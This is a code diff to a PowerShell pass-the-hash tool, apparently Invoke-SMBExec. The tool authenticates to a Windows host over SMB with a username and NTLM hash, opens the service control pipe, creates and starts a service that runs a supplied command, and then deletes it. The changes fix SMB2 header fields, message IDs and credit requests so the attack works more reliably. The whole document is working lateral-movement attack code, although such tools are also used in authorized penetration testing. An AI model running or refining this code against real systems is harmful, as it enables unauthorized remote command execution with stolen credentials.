@@ -72,10 +72,10 @@ param
     [parameter(ParameterSetName='Default',Mandatory=$true)][String]$Username,
     [parameter(ParameterSetName='Default',Mandatory=$false)][String]$Domain,
     [parameter(Mandatory=$false)][String]$Command,
-    [parameter(ParameterSetName='Default',Mandatory=$false)][ValidateSet("Y","N")][String]$CommandCOMSPEC="Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$CommandCOMSPEC="Y",
     [parameter(ParameterSetName='Default',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
     [parameter(Mandatory=$false)][String]$Service,
-    [parameter(ParameterSetName='Default',Mandatory=$true)][Switch]$SigningCheck,
+    [parameter(ParameterSetName='Default',Mandatory=$false)][Switch]$SigningCheck,
     [parameter(ParameterSetName='Session',Mandatory=$false)][Int]$Session,
     [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Logoff,
     [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Refresh,
@@ -126,6 +126,8 @@ function New-PacketNetBIOSSessionService
 function New-PacketSMBHeader
 {
     param([Byte[]]$packet_command,[Byte[]]$packet_flags,[Byte[]]$packet_flags2,[Byte[]]$packet_tree_ID,[Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID)
+
+    $packet_process_ID = $packet_process_ID[0,1]
 
     $packet_SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
     $packet_SMBHeader.Add("Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
@@ -338,7 +340,7 @@ function New-PacketSMBLogoffAndXRequest
 }
 
 #SMB2
-
+<#
 function New-PacketSMB2Header
 {
     param([Byte[]]$packet_command,[Int]$packet_message_ID,[Byte[]]$packet_tree_ID,[Byte[]]$packet_session_ID)
@@ -352,11 +354,36 @@ function New-PacketSMB2Header
     $packet_SMB2Header.Add("ChannelSequence",[Byte[]](0x00,0x00))
     $packet_SMB2Header.Add("Reserved",[Byte[]](0x00,0x00))
     $packet_SMB2Header.Add("Command",$packet_command)
-    $packet_SMB2Header.Add("CreditRequest",[Byte[]](0x00,0x00))
+    $packet_SMB2Header.Add("CreditRequest",[Byte[]](0x01,0x00))
     $packet_SMB2Header.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
     $packet_SMB2Header.Add("NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
     $packet_SMB2Header.Add("MessageID",$packet_message_ID)
     $packet_SMB2Header.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_SMB2Header.Add("TreeID",$packet_tree_ID)
+    $packet_SMB2Header.Add("SessionID",$packet_session_ID)
+    $packet_SMB2Header.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
+
+    return $packet_SMB2Header
+}
+#>
+function New-PacketSMB2Header
+{
+    param([Byte[]]$packet_command,[Byte[]]$packet_credit_request,[Int]$packet_message_ID,[Byte[]]$packet_process_ID,[Byte[]]$packet_tree_ID,[Byte[]]$packet_session_ID)
+
+    [Byte[]]$packet_message_ID = [System.BitConverter]::GetBytes($packet_message_ID) + 0x00,0x00,0x00,0x00
+
+    $packet_SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary
+    $packet_SMB2Header.Add("ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))
+    $packet_SMB2Header.Add("StructureSize",[Byte[]](0x40,0x00))
+    $packet_SMB2Header.Add("CreditCharge",[Byte[]](0x01,0x00))
+    $packet_SMB2Header.Add("ChannelSequence",[Byte[]](0x00,0x00))
+    $packet_SMB2Header.Add("Reserved",[Byte[]](0x00,0x00))
+    $packet_SMB2Header.Add("Command",$packet_command)
+    $packet_SMB2Header.Add("CreditRequest",$packet_credit_request)
+    $packet_SMB2Header.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_SMB2Header.Add("NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_SMB2Header.Add("MessageID",$packet_message_ID)
+    $packet_SMB2Header.Add("ProcessID",$packet_process_ID)
     $packet_SMB2Header.Add("TreeID",$packet_tree_ID)
     $packet_SMB2Header.Add("SessionID",$packet_session_ID)
     $packet_SMB2Header.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
@@ -870,7 +897,6 @@ if($session_string)
 
 $process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
 $process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
-$process_ID = $process_ID -replace "-00-00",""
 [Byte[]]$process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
 
 if(!$session_string)
@@ -1008,7 +1034,7 @@ if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table
                     $SMB2_tree_ID = 0x00,0x00,0x00,0x00
                     $SMB_session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                     $SMB2_message_ID = 1
-                    $packet_SMB2_header = New-PacketSMB2Header 0x00,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID  
+                    $packet_SMB2_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                     $packet_SMB2_data = New-PacketSMB2NegotiateProtocolRequest
                     $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                     $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
@@ -1044,8 +1070,8 @@ if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table
                     }
                     else
                     {
-                        $SMB2_message_ID += 1
-                        $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
+                        $SMB2_message_ID++
+                        $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                         $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $SMB_negotiate_flags
                         $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                         $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
@@ -1182,8 +1208,8 @@ if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table
             }
             else
             {
-                $SMB2_message_ID += 1
-                $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
+                $SMB2_message_ID++
+                $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $SMB2_message_ID  $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                 $packet_NTLMSSP_auth = New-PacketNTLMSSPAuth $NTLMSSP_response
                 $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                 $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        
@@ -1560,7 +1586,7 @@ if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table
                     'CreateServiceW'
                     {
                         $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID
-
+                        
                         if($SMB_signing)
                         {
                             $packet_SMB_header["Flags2"] = 0x05,0x48
@@ -2023,8 +2049,7 @@ if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table
                     'TreeConnect'
                     {
                         $SMB2_message_ID++
-                        $packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
-                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
+                        $packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
 
                         if($SMB_signing)
                         {
@@ -2065,12 +2090,10 @@ if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table
                   
                     'CreateRequest'
                     {
-                        #$SMB2_tree_ID = 0x01,0x00,0x00,0x00
                         $SMB2_tree_ID = $SMB_client_receive[40..43]
                         $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl
                         $SMB2_message_ID++
-                        $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
-                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
+                        $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                     
                         if($SMB_signing)
                         {
@@ -2124,8 +2147,7 @@ if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table
                         $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl
                         $SMB_file_ID = $SMB_client_receive[132..147]
                         $SMB2_message_ID++
-                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
-                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
+                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                     
                         if($SMB_signing)
                         {
@@ -2160,12 +2182,9 @@ if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table
                
                     'ReadRequest'
                     {
-
                         Start-Sleep -m $Sleep
                         $SMB2_message_ID++
-                        $packet_SMB2_header = New-PacketSMB2Header 0x08,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
-                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
-                        $packet_SMB2_header["CreditCharge"] = 0x10,0x00
+                        $packet_SMB2_header = New-PacketSMB2Header 0x08,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                     
                         if($SMB_signing)
                         {
@@ -2173,6 +2192,7 @@ if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table
                         }
 
                         $packet_SMB2_data = New-PacketSMB2ReadRequest $SMB_file_ID
+                        $packet_SMB2_data["Length"] = 0xff,0x00,0x00,0x00
                         $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                         $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                         $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
@@ -2216,9 +2236,8 @@ if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table
                 
                     'OpenSCManagerW'
                     {
-                        $SMB2_message_ID += 23
-                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
-                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
+                        $SMB2_message_ID++
+                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                     
                         if($SMB_signing)
                         {
@@ -2280,7 +2299,7 @@ if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table
                             else
                             {
                                 Write-Output "$output_username is a local administrator on $Target"
-                                $SMB2_message_ID += 20
+                                $SMB2_message_ID++
                                 $SMB_close_service_handle_stage = 2
                                 $SMB_client_stage = 'CloseServiceHandle'
                             }
@@ -2304,9 +2323,8 @@ if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table
                         
                         if($SMBExec_command_bytes.Length -lt $SMB_split_index)
                         {
-                            $SMB2_message_ID += 20
-                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
-                            $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
+                            $SMB2_message_ID++
+                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                         
                             if($SMB_signing)
                             {
@@ -2348,9 +2366,8 @@ if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table
                     'CreateServiceW_First'
                     {
                         $SMB_split_stage_final = [Math]::Ceiling($SCM_data.Length / $SMB_split_index)
-                        $SMB2_message_ID += 20
-                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
-                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
+                        $SMB2_message_ID++
+                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                         
                         if($SMB_signing)
                         {
@@ -2399,8 +2416,7 @@ if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table
                     {
                         $SMB_split_stage++
                         $SMB2_message_ID++
-                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
-                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
+                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                         
                         if($SMB_signing)
                         {
@@ -2447,8 +2463,7 @@ if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table
                     'CreateServiceW_Last'
                     {
                         $SMB2_message_ID++
-                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
-                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
+                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                         
                         if($SMB_signing)
                         {
@@ -2489,9 +2504,8 @@ if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table
                         {
                             Write-Verbose "Service $SMB_service created on $Target"
                             $SMB_service_context_handle = $SMB_client_receive[112..131]
-                            $SMB2_message_ID += 20
-                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
-                            $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
+                            $SMB2_message_ID++
+                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                         
                             if($SMB_signing)
                             {
@@ -2551,9 +2565,8 @@ if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table
                             Write-Output "Service $SMB_service failed to start on $Target"
                         }
 
-                        $SMB2_message_ID += 20
-                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
-                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
+                        $SMB2_message_ID++
+                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                         
                         if($SMB_signing)
                         {
@@ -2595,7 +2608,7 @@ if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table
                         if($SMB_close_service_handle_stage -eq 1)
                         {
                             Write-Verbose "Service $SMB_service deleted on $Target"
-                            $SMB2_message_ID += 20
+                            $SMB2_message_ID++
                             $SMB_close_service_handle_stage++
                             $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_context_handle
                         }
@@ -2606,8 +2619,7 @@ if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table
                             $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_manager_context_handle
                         }
 
-                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
-                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
+                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                     
                         if($SMB_signing)
                         {
@@ -2641,9 +2653,8 @@ if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table
 
                     'CloseRequest'
                     {
-                        $SMB2_message_ID += 20
-                        $packet_SMB2_header = New-PacketSMB2Header 0x06,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
-                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
+                        $SMB2_message_ID++
+                        $packet_SMB2_header = New-PacketSMB2Header 0x06,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                     
                         if($SMB_signing)
                         {
@@ -2675,8 +2686,7 @@ if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table
                     'TreeDisconnect'
                     {
                         $SMB2_message_ID++
-                        $packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
-                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
+                        $packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                     
                         if($SMB_signing)
                         {
@@ -2716,9 +2726,8 @@ if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table
 
                     'Logoff'
                     {
-                        $SMB2_message_ID += 20
-                        $packet_SMB2_header = New-PacketSMB2Header 0x02,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
-                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
+                        $SMB2_message_ID++
+                        $packet_SMB2_header = New-PacketSMB2Header 0x02,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                     
                         if($SMB_signing)
                         {
@@ -2744,6 +2753,7 @@ if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table
                         $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                         $SMB_client_stream.Flush()
                         $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                        $SMB_client_stage = 'Exit'
                     }
 
                 }
